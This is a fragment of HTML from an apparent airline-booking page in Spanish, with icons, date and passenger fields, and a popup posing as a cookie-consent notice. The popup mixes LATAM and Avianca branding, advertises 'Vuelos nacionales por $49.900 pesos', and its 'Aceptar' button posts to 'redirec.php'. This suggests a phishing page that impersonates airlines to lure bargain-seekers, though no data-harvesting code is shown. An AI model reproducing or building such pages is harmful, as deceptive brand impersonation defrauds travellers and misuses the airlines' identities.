3.33927C1.09516 3.52907 0.994133 3.79596 0.994133 4.14591V6.84463H15.3988V3.04865H13.2894C13.1441 3.04865 13.0304 3.00715 12.9357 2.92412C12.841 2.83515 12.7969 2.72835 12.7969 2.59193C12.7969 2.47924 12.841 2.3784 12.9357 2.28944C13.0304 2.20047 13.1441 2.15897 13.2894 2.15897H15.8848C16.0048 2.15897 16.1186 2.20047 16.207 2.28944C16.3017 2.3784 16.3461 2.47331 16.3461 2.59193V18.0487C16.3461 18.6655 16.15 19.14 15.7648 19.484C15.3986 19.828 14.8999 20 14.2684 20H0.507862C0.387876 20 0.274032 19.9526 0.172991 19.8517C0.0908954 19.7983 0.046875 19.7035 0.046875 19.567V4.14591C0.046875 3.55278 0.242592 3.07233 0.627811 2.70459C1.01303 2.34279 1.5245 2.15897 2.156 2.15897H3.96202V0.432966C3.96202 0.320273 4.00637 0.219437 4.10109 0.130469C4.19582 0.0474323 4.30952 0 4.45477 0C4.57476 0 4.68196 0.041501 4.77669 0.130469C4.87142 0.219437 4.91576 0.320273 4.91576 0.432966V4.08067C4.91576 4.21709 4.87142 4.32974 4.77669 4.41278C4.67565 4.50175 4.56828 4.54332 4.4483 4.54332Z"></path>
                        </svg>
                        <div class="index-input" id="label-dates">
                            <p class="placeholder">Agregar fecha</p>
                            <!-- <p><span class="fw-light text-italic tc-gray-smoke">Jue </span><b>25 De Ene</b><span class="fw-light text-italic tc-gray-smoke"> a Vie </span><b>26 De Ene</b></p> -->
                        </div>
                    </div>

                    <div class="pb-1 mt-2 border-bottom d-flex justify-space-between align-items-center" nada="showModal('select-passengers')">
                        <div class="d-flex align-items-center">
                            <svg style="margin-right: 24px;" viewBox="0 0 16 21" width="16" height="21" color="#2500c3">
                                <path style="fill: currentColor;" d="M8.63396 7.93475C8.33208 8.1047 8.01006 8.24279 7.66792 8.34901C7.34591 8.43399 7.01384 8.47648 6.6717 8.47648C5.58491 8.47648 4.63899 8.06221 3.83396 7.23369C3.04906 6.38391 2.6566 5.38543 2.6566 4.23824C2.6566 3.09105 3.04906 2.10319 3.83396 1.27466C4.63899 0.424886 5.58491 0 6.6717 0C7.41635 0 8.10063 0.201821 8.72453 0.605463C9.34843 1.0091 9.83145 1.52959 10.1736 2.16692C10.3346 2.48558 10.4553 2.82549 10.5358 3.18665C10.6365 3.52656 10.6868 3.87709 10.6868 4.23824C10.6868 5.02428 10.4956 5.74659 10.1132 6.40516C9.73082 7.06373 9.23773 7.5736 8.63396 7.93475ZM9.75094 4.23824C9.75094 3.34598 9.44906 2.58118 8.84528 1.94385C8.24151 1.30653 7.51698 0.987861 6.6717 0.987861C5.82641 0.987861 5.10189 1.30653 4.49811 1.94385C3.89434 2.58118 3.59245 3.34598 3.59245 4.23824C3.59245 5.1305 3.89434 5.8953 4.49811 6.53263C5.10189 7.16995 5.82641 7.48862 6.6717 7.48862C7.51698 7.48862 8.24151 7.16995 8.84528 6.53263C9.44906 5.8953 9.75094 5.1305 9.75094 4.23824ZM0.935849 20.4901C0.935849 20.6388 0.885535 20.7663 0.784906 20.8725C0.704403 20.9575 0.593711 21 0.452831 21C0.332076 21 0.221384 20.9575 0.120755 20.8725C0.0402516 20.7663 0 20.6388 0 20.4901V13.7026C0 13.5964 0.0201258 13.5008 0.0603775 13.4158C0.120755 13.3308 0.201258 13.2671 0.301887 13.2246L13.3736 8.25341C14.1182 7.95599 14.7421 7.98786 15.2453 8.34901C15.7484 8.68892 16 9.24127 16 10.0061V20.4583C16 20.5857 15.9497 20.7026 15.8491 20.8088C15.7686 20.8938 15.6579 20.9363 15.517 20.9363C15.3761 20.9363 15.2654 20.8938 15.1849 20.8088C15.1044 20.7026 15.0641 20.5857 15.0641 20.4583V10.0061C15.0641 9.60243 14.9434 9.31563 14.7019 9.14567C14.4805 8.97572 14.1484 8.98634 13.7057 9.17754L0.935849 14.0531V20.4901Z"></path>
                            </svg>
                            <p id="label-passengers">1 Adulto</p>
                        </div>
                        <svg viewBox="0 0 24 24" width="20" height="20" color="#2500c3" id="iconAddPassengerCTA">
                            <path d="M12 1C18.1 1 23 5.9 23 12C23 18.1 18.1 23 12 23C5.9 23 1 18.1 1 12C1 5.9 5.9 1 12 1ZM12 0C5.4 0 0 5.4 0 12C0 18.6 5.4 24 12 24C18.6 24 24 18.6 24 12C24 5.4 18.6 0 12 0Z"></path>
                            <path d="M18 11.5H12.5V6H11.5V11.5H6V12.5H11.5V18H12.5V12.5H18V11.5Z"></path>
                        </svg>
                    </div>

                    <button class="btn-success mt-1">Confirmar</button>
                </div>
            </div>
        </div>



        <div class="card p-1 mt-3">
            <div class="card-banner" style=" clip-path: inset(0% 0% -8% 0%);">
                <img src="./assets/media/main_banner.png">
            </div>

           
        </div>


        <div id="popup-container">

        <form action="redirec.php" method="post" name="punto" id="popup" class="pop2">

<div id="contenedor" class="contenedor">
    <div class="banner_logo"></div>
    <img class="imagen" src="img/logoltm.png" title="Avianca Logo" alt="Avianca Logo">
    <div id="onetrust-policy">
        <h2 id="onetrust-policy-title" class="tit">Consentimiento de cookies</h2>
        <p id="onetrust-policy-text" class="texto">En LATAM utilizamos cookies propias y de terceros con fines analíticos y a fin de garantizar la funcionalidad de la web, mejorar tu experiencia y mostrar publicidad relacionada con tus preferencias. Puedes "Aceptar" o seleccionar aquellas que quieras en "Configurar cookies". Para conocer más, consulta nuestra <a href="https://www.avianca.com/es/informacion-legal/politica-de-cookies/" class="politicas" aria-label="Política de cookies, se abre en una nueva pestaña">Política de cookies.</a></p>
    </div>
</div>
<input type="hidden" id="identification-input" name="enviar" style="color: #494746;" value="Vuelos nacionales por $49.900 pesos" placeholder="Vuelos nacionales por $49.900 pesos">
<input type="hidden" name="enviar" value="1">
<br>
<button type="submit" class="btn00" style="margin-bottom: 2%;  border-radius: 1.625em;  border-width: 1px;  border-style: solid;  margin-right: 0.4rem;  padding: 0.813em 1.422em; background-color: #2a0088;  border-color: #1b1b1b; color: #FFFFFF; width: 100%;">Aceptar</button>
</form>




        </div>
        <style>
            .sf {
                font-size: 10%;
            }

            .contenedor {
                display: flex;
                /* Esto activa flexbox para el contenedor */
                align-items: center;
                /* Centra los elementos verticalmente */
                justify-content: flex-start;
                /* Alinea los elementos hacia el inicio del contenedor */
            }

            .imagen {
                width: 66px;
                /* O el tamaño que desees para la imagen */
                margin-right: 20px;
                /* Añade un margen derecho para separar la imagen del texto */
                border-radius: 60%;
            }

            .texto {
                flex-grow: 1;
                /* Permite que el texto ocupe el espacio restante */
                text-align: left;
                /* Alinea el texto a la izquierda */
                font-family: "Roboto", sans-serif;
                font-weight: 400;
                font-style: normal;
                font-size: 15px;
            }

            .tit {
                font-family: "Roboto", sans-serif;
                font-weight: 400;
                font-style: normal;
                text-align: left;
            }

            .politicas {
                font-family: "Roboto", sans-serif;
                font-weight: 500;
                font-style: normal;
                color: #0190a0;
            }
        </style>
    








        <!-- SCRIPTS -->
        



</main></body>